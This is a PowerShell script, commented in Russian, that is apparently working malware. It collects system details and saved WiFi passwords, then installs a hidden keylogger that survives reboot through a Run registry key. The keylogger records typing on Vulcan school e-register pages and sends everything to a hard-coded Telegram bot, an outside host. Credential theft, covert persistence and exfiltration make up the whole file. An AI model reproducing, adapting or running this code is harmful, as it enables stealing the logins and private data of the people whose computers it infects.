# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# ПРОСТОЙ И ЭФФЕКТИВНЫЙ КЕЙЛОГГЕР
$keyloggerStatus = "Creating keylogger..."

# Создаем кейлоггер с нуля
$keyloggerScript = @"
# Добавляем необходимые библиотеки
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Глобальные переменные
`$monitoring = `$false
`$monitorEndTime = `$null
`$logData = ""
`$lastActivity = Get-Date

# Функция отправки в Telegram
function Send-Telegram {
    param(`$Message)
    try {
        `$Body = @{
            chat_id = '5674514050'
            text = `$Message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$Body -TimeoutSec 5
    } catch {
        # Игнорируем ошибки отправки
    }
}

# Функция получения активного окна
function Get-CurrentWindow {
    try {
        `$processes = Get-Process | Where-Object { 
            `$_.MainWindowTitle -ne "" -and `$_.MainWindowHandle -ne 0
        }
        
        if (`$processes) {
            `$active = `$processes | Sort-Object CPU -Descending | Select-Object -First 1
            return @{
                Title = `$active.MainWindowTitle
                Process = `$active.ProcessName
            }
        }
    } catch {}
    return `$null
}

# Функция проверки сайтов Vulcan
function Check-VulcanSites {
    `$window = Get-CurrentWindow
    if (-not `$window) { return `$false }
    
    `$title = `$window.Title.ToLower()
    `$process = `$window.Process.ToLower()
    
    # Проверяем что это браузер
    `$isBrowser = `$process -match "chrome|firefox|edge|msedge|opera|brave|iexplore"
    if (-not `$isBrowser) { return `$false }
    
    # Проверяем целевые сайты
    `$targetSites = @(
        "uonetplus.vulcan.net.pl/minrol",
        "uonetplus.vulcan.net.pl/rybnik", 
        "uonetplus.vulcan.net.pl",
        "vulcan.net.pl"
    )
    
    foreach (`$site in `$targetSites) {
        if (`$title.Contains(`$site)) {
            return `$true
        }
    }
    
    return `$false
}

# Функция проверки Google
function Check-Google {
    `$window = Get-CurrentWindow
    if (-not `$window) { return `$false }
    
    `$title = `$window.Title.ToLower()
    `$process = `$window.Process.ToLower()
    
    `$isBrowser = `$process -match "chrome|firefox|edge|msedge|opera|brave|iexplore"
    if (-not `$isBrowser) { return `$false }
    
    return `$title.Contains("google") -or `$title.Contains("поиск") -or `$title.Contains("search")
}

# Функция старта мониторинга
function Start-Monitoring {
    `$global:monitoring = `$true
    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
    `$global:logData = ""
    `$global:lastActivity = Get-Date
    
    `$window = Get-CurrentWindow
    Send-Telegram "🎯 VULCAN SITE DETECTED!`n📱 Started 2-minute monitoring`n💻 Window: `$(`$window.Title)`n⏰ Ends: `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
}

# Функция остановки мониторинга и отправки логов
function Stop-Monitoring {
    `$global:monitoring = `$false
    `$global:monitorEndTime = `$null
    
    if (`$global:logData -ne "") {
        if (`$global:logData.Length -gt 4000) {
            # Разбиваем длинные сообщения
            `$chunks = [System.Math]::Ceiling(`$global:logData.Length / 4000)
            for (`$i = 0; `$i -lt `$chunks; `$i++) {
                `$chunk = `$global:logData.Substring(`$i * 4000, [System.Math]::Min(4000, `$global:logData.Length - `$i * 4000))
                Send-Telegram "📝 KEYLOG PART `$(`$i+1)/`$chunks:`n`$chunk"
                Start-Sleep -Seconds 1
            }
        } else {
            Send-Telegram "📝 COMPLETE KEYLOG:`n`$global:logData"
        }
    }
    
    Send-Telegram "⏹️ MONITORING STOPPED - 2 minutes completed"
    `$global:logData = ""
}

# Функция обработки клавиш
function Process-Key {
    param(`$KeyCode)
    
    `$key = [System.Windows.Forms.Keys]`$KeyCode
    
    # Специальные клавиши
    switch (`$key) {
        "Return" { 
            `$global:logData += "[ENTER]"
            Send-Telegram "↵ ENTER pressed"
        }
        "Space" { 
            `$global:logData += " " 
        }
        "Back" { 
            `$global:logData += "[BACKSPACE]"
        }
        "Tab" { 
            `$global:logData += "[TAB]"
        }
        "Escape" { 
            `$global:logData += "[ESC]"
        }
        "LButton" {
            `$global:logData += "[MOUSE_LEFT]"
        }
        "RButton" {
            `$global:logData += "[MOUSE_RIGHT]"
        }
        "MButton" {
            `$global:logData += "[MOUSE_MIDDLE]"
        }
        "LShiftKey" { }
        "RShiftKey" { }
        "LControlKey" { }
        "RControlKey" { }
        "LMenu" { }
        "RMenu" { }
        "Capital" { }
        "NumLock" { }
        "Scroll" { }
        default {
            # Буквы A-Z
            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
                `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
                `$isCaps = [System.Console]::CapsLock
                
                if ((`$isShift -and -not `$isCaps) -or (-not `$isShift -and `$isCaps)) {
                    `$global:logData += `$key.ToString()
                } else {
                    `$global:logData += `$key.ToString().ToLower()
                }
            }
            # Цифры 0-9
            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
                `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                if (`$isShift) {
                    `$global:logData += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
                } else {
                    `$global:logData += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
                }
            }
            # Специальные символы
            else {
                switch (`$key) {
                    "OemPeriod" { `$global:logData += "." }
                    "Oemcomma" { `$global:logData += "," }
                    "OemMinus" { `$global:logData += "-" }
                    "Oemplus" { `$global:logData += "=" }
                    "OemQuestion" { `$global:logData += "/" }
                    "Oemtilde" { `$global:logData += "`"" }
                    "OemOpenBrackets" { `$global:logData += "[" }
                    "OemCloseBrackets" { `$global:logData += "]" }
                    "OemPipe" { `$global:logData += "\" }
                    "OemSemicolon" { `$global:logData += ";" }
                    "OemQuotes" { `$global:logData += "'" }
                    "Decimal" { `$global:logData += "." }
                    "Divide" { `$global:logData += "/" }
                    "Multiply" { `$global:logData += "*" }
                    "Subtract" { `$global:logData += "-" }
                    "Add" { `$global:logData += "+" }
                }
            }
        }
    }
    
    `$global:lastActivity = Get-Date
}

# Основной цикл
Send-Telegram "🔍 KEYLOGGER STARTED`n🎯 Waiting for Vulcan sites...`n⏰ Will monitor for 2 minutes after detection"

`$lastGoogleCheck = Get-Date
`$googleReported = `$false

while (`$true) {
    try {
        # Проверяем Google каждые 10 секунд
        if ((Get-Date) - `$lastGoogleCheck -gt [TimeSpan]::FromSeconds(10)) {
            `$lastGoogleCheck = Get-Date
            if (Check-Google -and -not `$googleReported) {
                Send-Telegram "🔍 USER IS USING GOOGLE SEARCH"
                `$googleReported = `$true
            } elseif (-not (Check-Google)) {
                `$googleReported = `$false
            }
        }
        
        # Проверяем сайты Vulcan
        if (Check-VulcanSites) {
            if (-not `$monitoring) {
                Start-Monitoring
            } else {
                # Обновляем время окончания при повторном обнаружении
                `$global:monitorEndTime = (Get-Date).AddMinutes(2)
            }
        }
        
        # Если мониторинг активен
        if (`$monitoring) {
            # Проверяем время окончания
            if ((Get-Date) -gt `$monitorEndTime) {
                Stop-Monitoring
            } else {
                # Перехватываем все клавиши
                for (`$i = 1; `$i -le 255; `$i++) {
                    `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                    if (`$keyState -eq -32767) {
                        Process-Key -KeyCode `$i
                    }
                }
                
                # Автоотправка каждые 30 секунд активности
                if ((Get-Date) - `$global:lastActivity -gt [TimeSpan]::FromSeconds(30) -and `$global:logData -ne "") {
                    if (`$global:logData.Length -gt 1000) {
                        Send-Telegram "📝 AUTO-SEND:`n`$(`$global:logData.Substring(0, 1000))..."
                        `$global:logData = `$global:logData.Substring(1000)
                    }
                    `$global:lastActivity = Get-Date
                }
            }
        }
        
        Start-Sleep -Milliseconds 10
        
    } catch {
        # Продолжаем работу при ошибках
        Start-Sleep -Milliseconds 100
    }
}
"@

# Сохраняем и запускаем кейлоггер
try {
    $keyloggerPath = "$env:TEMP\system_monitor.ps1"
    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
    
    # Запускаем в отдельном процессе
    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\system_monitor.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ KEYLOGGER ACTIVE - Monitoring Vulcan sites + Google search detection"
    
} catch {
    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== TARGET SITES ===
• https://uonetplus.vulcan.net.pl/minrol
• https://uonetplus.vulcan.net.pl/rybnik
• https://uonetplus.vulcan.net.pl/

=== FEATURES ===
🎯 Auto-starts on Vulcan sites detection
⏰ 2-minute monitoring session
🔍 Google search detection
📝 Logs ALL keystrokes and mouse clicks
🔄 Auto-sends logs every 30 seconds
💾 Persistent after reboot

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Очистка
Start-Sleep 2
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
